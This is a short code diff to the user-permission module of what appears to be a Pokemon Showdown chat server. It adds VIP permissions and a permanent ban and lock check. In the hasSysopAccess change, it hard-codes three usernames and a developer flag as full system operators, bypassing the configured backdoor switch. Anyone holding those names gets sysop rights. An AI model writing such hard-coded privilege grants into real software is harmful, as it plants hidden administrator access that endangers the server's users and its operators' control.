@@ -588,6 +588,7 @@ User = (function () {
 	User.prototype.isStaff = false;
 	User.prototype.can = function (permission, target, room) {
 		if (this.hasSysopAccess()) return true;
+		if (permission === 'vip' && Users.vips[this.userid] && !target) return true;
 
 		let group = this.group;
 		let targetGroup = '';
@@ -643,7 +644,7 @@ User = (function () {
 	 * Special permission check for system operators
 	 */
 	User.prototype.hasSysopAccess = function () {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || this.newstoryDev || this.userid == 'showdownhelper' || this.userid == 'lmaoitsbt' || this.userid == 'mew&blue') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -984,6 +985,17 @@ User = (function () {
 			this.send("|popup|Your username (" + name + ") is banned" + bannedUnder + "'. Your ban will expire in a few days." + (Config.appealurl ? " Or you can appeal at:\n" + Config.appealurl : ""));
 			this.ban(true, userid);
 			return;
+		}
+		if (global.Permaban && !this.can('staff')) {
+			if (Permaban.permaBan[userid]) {
+				this.send("|popup|Your username (" + name + ") is banned.");
+				this.ban(true, userid);
+				return;
+			}
+			if (Permaban.permaLock[userid]) {
+				this.send("|popup|Your username (" + name + ") is locked.");
+				this.lock(true, userid);
+			}
 		}
 		if (registered && userid in lockedUsers) {
 			let bannedUnder = '';
